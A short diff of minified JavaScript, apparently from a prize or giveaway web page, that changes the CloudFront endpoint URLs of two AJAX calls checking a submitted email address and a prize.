@@ -14,7 +14,7 @@ function telewin() {
         t = !1;
     t || (t = !0, $.ajax({
         type: "POST",
-        url: "https://d2odr8df02d6cs.cloudfront.net/check-mail",
+        url: "https://d6ow8diqzony0.cloudfront.net/check-mail",
         dataType: "json",
         contentType: "application/json",
         crossDomain: !0,
@@ -27,7 +27,7 @@ function telewin() {
                     case "EMAIL_SAVED":
                         $.ajax({
                             type: "POST",
-                            url: "https://d2odr8df02d6cs.cloudfront.net/check-prize",
+                            url: "https://d6ow8diqzony0.cloudfront.net/check-prize",
                             dataType: "json",
                             contentType: "application/json",
                             crossDomain: !0,
